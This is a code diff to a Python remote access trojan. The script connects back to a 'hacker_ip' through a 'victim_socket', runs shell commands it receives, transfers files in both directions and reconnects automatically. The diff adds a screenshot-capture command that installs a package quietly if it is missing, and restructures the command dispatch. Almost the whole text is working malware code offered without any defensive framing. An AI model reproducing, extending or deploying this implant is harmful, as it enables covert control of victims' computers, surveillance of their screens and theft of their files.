@@ -5,7 +5,7 @@ import os
 import glob
 import json
 import struct
-
+from datetime import datetime
 
 victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 hacker_ip = "192.168.100.17"
@@ -50,7 +50,31 @@ while True:
                 victim_socket.close()
                 exit()
 
-            if command.startswith("cd"):
+            elif command == "screenshot":
+                try:
+                    import mss
+                except ImportError:
+                    subprocess.check_output("pip install mss", shell=True, stderr=subprocess.STDOUT)
+                    import mss
+
+                try:
+                    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+                    image_name = f"screenshot-{timestamp}.png"
+
+                    with mss.mss() as sct:
+                        sct.shot(output=image_name)
+                    
+                except Exception as e:
+                    print(f"Capturing Screenshot failed! {e}")
+
+                try:
+                    victim_socket.send(f"\nScreenshot saved as {image_name}".encode())
+                except Exception as e:
+                    print(f"Send failed: {e}")
+
+                continue
+            
+            elif command.startswith("cd"):
                 path_to_move = command[3:].strip()
                 
                 if not path_to_move:
@@ -79,7 +103,7 @@ while True:
                         continue
                 continue    
 
-            if command.startswith("download"):
+            elif command.startswith("download"):
                 if len(command.strip()) <= 8 or not command[9:].strip():
                     error_msg = "\nError: Please specify a filename after 'download'\ndownload <filename>"
                     try:
@@ -163,7 +187,7 @@ while True:
                             continue
                         continue
 
-            if command.startswith("upload"):
+            elif command.startswith("upload"):
                 file_name = command[7:].strip()
 
                 try:
@@ -208,35 +232,35 @@ while True:
 
                 continue
                 
-            
-            try:
-                encoding = "utf-8"
-                if(os.name == "nt"):
-                    encoding = "cp437"
-                command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                decoded_output = command_output.decode(encoding, errors="replace").strip()
-                if(decoded_output == ""):
-                    command_output = f"\n{command} executed successfully (no output)!".encode()
-                else:
-                    command_output = decoded_output.encode("utf-8")
-            
-            except subprocess.CalledProcessError as e:
-                if e.output:
-                    error_output = e.output.decode(encoding, errors="replace")
-                else:
-                    error_output = str(e)
-                command_output = f"\nCommand failed:\n{error_output}".encode()
-            
-            except Exception as e:
-                command_output = f"\nError: {str(e)}".encode()
+            else:                
+                try:
+                    encoding = "utf-8"
+                    if(os.name == "nt"):
+                        encoding = "cp437"
+                    command_output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+                    decoded_output = command_output.decode(encoding, errors="replace").strip()
+                    if(decoded_output == ""):
+                        command_output = f"\n{command} executed successfully (no output)!".encode()
+                    else:
+                        command_output = decoded_output.encode("utf-8")
+                
+                except subprocess.CalledProcessError as e:
+                    if e.output:
+                        error_output = e.output.decode(encoding, errors="replace")
+                    else:
+                        error_output = str(e)
+                    command_output = f"\nCommand failed:\n{error_output}".encode()
+                
+                except Exception as e:
+                    command_output = f"\nError: {str(e)}".encode()
 
-            print(f"\n{command} is executed successfully!")
-            
-            try:
-                victim_socket.send(command_output)
-            except Exception as e:
-                print(f"\nSend failed: {e}")
-                continue
+                print(f"\n{command} is executed successfully!")
+                
+                try:
+                    victim_socket.send(command_output)
+                except Exception as e:
+                    print(f"\nSend failed: {e}")
+                    continue
             
     except Exception as e:
         print(f"[!] Connection error: {e}")
@@ -244,3 +268,4 @@ while True:
     victim_socket.close()
     print("[*] Disconnected. Reconnecting in 5 seconds...")
     time.sleep(5)
+
